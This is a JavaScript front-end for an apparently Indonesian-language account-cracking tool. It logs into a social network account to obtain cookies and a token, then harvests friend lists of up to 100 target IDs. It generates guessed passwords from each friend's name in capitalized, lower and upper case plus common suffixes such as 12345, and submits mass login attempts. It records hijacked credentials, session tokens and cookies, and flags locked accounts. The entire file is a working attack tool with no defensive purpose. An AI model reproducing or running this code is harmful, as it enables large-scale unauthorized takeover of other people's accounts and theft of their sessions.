
function alert(type,message,durasi) {
  $("#response").html('<div class="alert alert-' + type + '"><b>' + message + '</b></div>');
  $(".alert").fadeTo(durasi, 300).slideUp(1000, function(){
    $(this).remove();
  });
}

function persen(a, b) {
  return (Math.floor((a / b) * 100));
}

function progres(hit,ban) {
  $("#banding").html("Grab Friends Proses: " + hit + "/" + ban);
  var per = persen(hit, ban) + "%";
  $("#persen").css("width", per).html('<b>' + per + '</b>');
  return persen(hit, ban);
}

function pwdlist(hit,ban) {
  var jumpw = hit+1;
  $("#pwlist").html("Password Proses: " + jumpw + "/" + ban);
  var per = persen(hit, ban) + "%";
  $("#pwpersen").css("width", per).html('<b>' + per + '</b>');
  return persen(hit, ban);
}

function attacklist(hit,ban) {
  $("#uidlist").html("Attack Progres: " + hit + "/" + ban);
  var per = persen(hit, ban) + "%";
  $("#uidpersen").css("width", per).html('<b>' + per + '</b>');
  return persen(hit, ban);
}

function OpenGrab(){

  this.alert = function(message,title){
    $("#response").html('<div id="dialogoverlay"></div><div id="dialogbox" class="slit-in-vertical"><div><div id="dialogboxhead"></div><div id="dialogboxbody"></div><div id="dialogboxfoot"></div></div></div>');

    let dialogoverlay = $("#dialogoverlay");
    let dialogbox = $("#dialogbox");

    let winH = window.innerHeight;
    dialogoverlay.css("height", winH+"px");

    dialogoverlay.css("top", "100px");

    dialogoverlay.css("display", "block");
    dialogbox.css("display", "block");

    $("#dialogboxhead").css('display','block');

    if(typeof title === 'undefined') {
      $("#dialogboxhead").css('display','none');
    } else {
      $("#dialogboxhead").html('<i class="fa fa-exclamation-circle" aria-hidden="true"></i> '+ title);
    }

    let para = '<b id="banding"></b> <b id="total"></b> <b id="unique"></b>';
        para += '<div class="progress progress-warning">';
        para += '<div id="persen" class="progress-bar" style="width: %"></div>';
        para += '</div><div id="nextstep"></div>';
        para += message;

    $("#dialogboxbody").html(para);
    $("#dialogboxfoot").html('<input type="hidden" id="run" value="1"/><button class="button-action active" onclick="Grab.close()">Close</button>');

  }

  this.close = function(){
    $("#dialogbox").css('display','none');
    $("#dialogoverlay").css('display','none');
    $("#run").val(0);
  }

  this.stop = function(){
    console.log('stop');
  }
}

let Grab = new OpenGrab();

function getCookies(){

    var email = $('#email').val();
    var pass = $('#pass').val();
    if (!email) {
      alert("danger","Email tidak boleh kosong!",2000);
    }else if (!pass) {
      alert("danger","Password tidak boleh kosong!",2000);
    }else{
      $("#login").html('<i class="fa fa-spinner fa-spin"></i> Prosesing...');
      let field = {
        field: "Login",
        email: email,
        pass: pass
      };

      $.post("/auth.php",field, function(x, status){
        if (x.response == 200) {
          $('#cookies').val(x.session.cookies);
          $('#token').val(x.session.token);
          alert("success","Success!" + ' ID ' + x.user.id + ' Name ' + x.user.name,4000);
        }else if (x.response == 300) {
          alert("warning",x.message,2000);
        }else{
          alert("danger",x.message,2000);
        }
        $("#login").html('Get Cookies');
      });
    }
}

function startGrab() {

  var hitung = 0;
  var cookies = $('#cookies').val();
  var uid = $('#masteruid').val().split("\n");

  masteruid = uid.filter(function (i) {
    return i != "";
  });

  if (!cookies) {
    alert("danger","Cookies Login tidak boleh kosong!",2000);
  }else if (!uid) {
    alert("danger","UID Master tidak boleh kosong!",2000);
  }else{

    if (uid.length > 100) {
      alert("danger","Total UID: " + uid.length + ", UID Master max 100!",2000);
    }else {

      Grab.alert('<span class="pcx-input"><textarea id="uidresult" rows="5" disabled></textarea></span>','Grabbing Progres!');
      progres(hitung,uid.length);

      function getToken() {

        let field = {
          field: "Cookies",
          cookies: cookies
        };

        $.post("/auth.php",field, function(x, status){
          if (x.response == 200) {
            $('#token').val(x.session.token);
            GrabFriends();
          }else{
            alert("danger",x.message,2000);
          }
         $("#login").html('Get Token Access');
        });

      }
      //==============================//
      function GrabFriends(next = 0){
        if (hitung < uid.length && $("#run").val() == 1) {
          var token = $('#token').val();
          var uids = uid[hitung];
          var getData = {
            method: "GET",
            token: token,
            cookies: cookies,
            uid: uids,
            field: "friends"
          };

          if (next == 0) {
            hitung++;
          } else {
            getData.after = next;
          }

          $.getJSON("/auth.php", getData, function (a) {
            var d = a.data;
            if (d.length >= 1) {
              var listUID = [];
              for (var i = 0; i < d.length; i++) {
                restUID = d[i]["id"] + ',' + d[i]["detail"];
                listUID = listUID.concat(restUID);
              }

              $("#uidresult").val($("#uidresult").val() + listUID.join("\n").replaceAll(',,', ',') + "\n");
              $('#uidresult').scrollTop($('#uidresult')[0].scrollHeight);
              total = $("#uidresult").val().split("\n").length;
              $("#total").html('Result UID: ' + total);

            }
            if (d.after !== undefined) {
              GrabFriends(d.after);
              return true;
            }

            var pro = progres(hitung,uid.length);
            if (pro >= 100) {
              $("#run").val(2);
              filterUid();
            }

            if (hitung < uid.length) {
              getToken(1);
            }

          })
          .fail(function (a) {

            var pro = progres(hitung,uid.length);
            if (pro >= 100) {
              $("#run").val(2);
              filterUid();
            }

            if (hitung < uid.length) {
              getToken(1);
            }

          });

        }
      }
      //============================//
      if (!$('#token').val()) {
          getToken();
      }else {
        GrabFriends();
      }
    }

  }
}

function filterUid() {
  var uidresult = $("#uidresult").val().split("\n");
  var hitung = 0;
  var pwhitung = 0;

  uidresult = uidresult.filter(function (i) {
    return i != "";
  });

  var uiduniq = [...new Set(uidresult)];
  var pwlist = ['',12345,54321,1234,4321,123,321,147,741,369,963,159,951,753,357,12,21,1,2,3,4,5,6,7,8,9,0];

  $("#unique").val('Total Uniq: ' + uiduniq.length);

  var param = '<b id="pwlist">' + pwlist.length + '</b>  <b id="passmode"></b>';
      param += '<div class="progress progress-danger">';
      param += '<div id="pwpersen" class="progress-bar" style="width: %"></div>';
      param += '</div>';

  var params = '<b id="uidlist">' + uiduniq.length + '</b>';
      params += '<div class="progress progress-success">';
      params += '<div id="uidpersen" class="progress-bar" style="width: %"></div>';
      params += '</div>';

  function toUpper() {
    if (hitung < uiduniq.length && $("#run").val() == 2) {

      $("#uidresult").val()
      user = uiduniq[hitung].split("\,");
      var berhitung = 2;
      for (let b = 0; b < user.length; b++) {
        if (b > 0) {
          var password = user[b].toUpperCase() + pwlist[pwhitung];
          let field = {
            field: "Login",
            email: user[0],
            pass: password
          };
          $("#uidresult").val($("#uidresult").val() + user[0] + ' : ' + password +"\n");

          $.post("/auth.php",field, function(x, status){

            if (x.response == 200) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "	:	" + x.session.token + "	:	" + x.session.cookies + "\n");
            }

            if (x.response == 300) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "Akun Locked\n");
            }

            var totallogin = berhitung++;
            if (totallogin >= user.length) {
              hitung++;
              var prolog = attacklist(hitung,uiduniq.length);
              if (prolog <= 100) {
                if (hitung < uiduniq.length) {
                  $("#uidresult").val("");
                  toUpper();
                }else {
                  pwhitung++;
                  var prospw = pwdlist(pwhitung,pwlist.length);
                  if (prospw < 100) {
                    hitung = 0;
                    attacklist(hitung,uiduniq.length);
                    toUpper();
                  }else {
                    $("#run").val(3);
                    $("#uidresult").val("All mode have been used..\n");
                  }
                }
              }
            }//#######################

          });
        }
      }// akhir for
    }
  }

  function toLower() {
    if (hitung < uiduniq.length && $("#run").val() == 2) {

      $("#uidresult").val()
      user = uiduniq[hitung].split("\,");
      var berhitung = 2;
      for (let b = 0; b < user.length; b++) {
        if (b > 0) {
          var password = user[b].toLowerCase() + pwlist[pwhitung];
          let field = {
            field: "Login",
            email: user[0],
            pass: password
          };
          $("#uidresult").val($("#uidresult").val() + user[0] + ' : ' + password +"\n");

          $.post("/auth.php",field, function(x, status){

            if (x.response == 200) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "	:	" + x.session.token + "	:	" + x.session.cookies + "\n");
            }

            if (x.response == 300) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "Akun Locked\n");
            }

            var totallogin = berhitung++;
            if (totallogin >= user.length) {
              hitung++;
              var prolog = attacklist(hitung,uiduniq.length);
              if (prolog <= 100) {
                if (hitung < uiduniq.length) {
                  $("#uidresult").val("");
                  toLower();
                }else {
                  pwhitung++;
                  var prospw = pwdlist(pwhitung,pwlist.length);
                  if (prospw < 100) {
                    hitung = 0;
                    attacklist(hitung,uiduniq.length);
                    toLower();
                  }else {
                    $("#passmode").html(' Mode: Upper');
                    hitung = 0;
                    pwhitung = 0;
                    $("#uidresult").val("");
                    toUpper();
                  }
                }
              }
            }//#######################

          });
        }
      }// akhir for
    }
  }

  function tocapitalize() {
    if (hitung < uiduniq.length && $("#run").val() == 2) {

      $("#uidresult").val()
      user = uiduniq[hitung].split("\,");
      var berhitung = 2;
      for (let b = 0; b < user.length; b++) {
        if (b > 0) {

          const text = user[b].toLowerCase();
          const awal = text.charAt(0);
          const kapital = awal.toUpperCase();
          const hasil = kapital + text.substr(1);

          var password = hasil + pwlist[pwhitung];

          let field = {
            field: "Login",
            email: user[0],
            pass: password
          };
          $("#uidresult").val($("#uidresult").val() + user[0] + ' : ' + password +"\n");

          $.post("/auth.php",field, function(x, status){

            if (x.response == 200) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "	:	" + x.session.token + "	:	" + x.session.cookies + "\n");
            }

            if (x.response == 300) {
                $("#loginsave").val($("#loginsave").val() + user[0] + "	:	" + password + "Akun Locked\n");
            }

            var totallogin = berhitung++;
            if (totallogin >= user.length) {
              hitung++;
              var prolog = attacklist(hitung,uiduniq.length);
              if (prolog <= 100) {
                if (hitung < uiduniq.length) {
                  $("#uidresult").val("");
                  tocapitalize();
                }else {
                  pwhitung++;
                  var prospw = pwdlist(pwhitung,pwlist.length);
                  if (prospw < 100) {
                    hitung = 0;
                    attacklist(hitung,uiduniq.length);
                    tocapitalize();
                  }else {
                    $("#passmode").html(' Mode: Lower');
                    hitung = 0;
                    pwhitung = 0;
                    $("#uidresult").val("");
                    toLower();
                  }
                }
              }
            }

          });
        }
      }// akhir for
    }
  }

  if (uiduniq.length > 0) {
    $("#nextstep").append(param);
    $("#nextstep").append(params);
    pwdlist(pwhitung,pwlist.length);
    attacklist(hitung,uiduniq.length);
    $("#passmode").html(' Mode: Capital');
    $("#loginsave").val("Starting Attack..\n");
    tocapitalize();
  }

}
